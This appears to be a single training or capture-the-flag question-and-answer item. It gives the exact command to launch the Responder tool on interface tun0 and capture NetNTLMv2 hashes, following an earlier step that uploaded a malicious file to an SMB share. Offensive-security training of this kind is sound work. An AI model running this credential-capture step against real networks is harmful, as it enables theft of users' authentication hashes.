TECHNIQUE / QUESTION:
How do you initiate the Responder tool to capture NTLM hashes?

CONTEXT:
You have uploaded the malicious exploit to the SMB share.

METHOD / ANSWER:
Command: `sudo uv run /opt/Responder/Responder.py -I tun0`
Explanation: This starts the Responder tool to capture NetNTLMv2 hashes as users trigger authentication attempts.
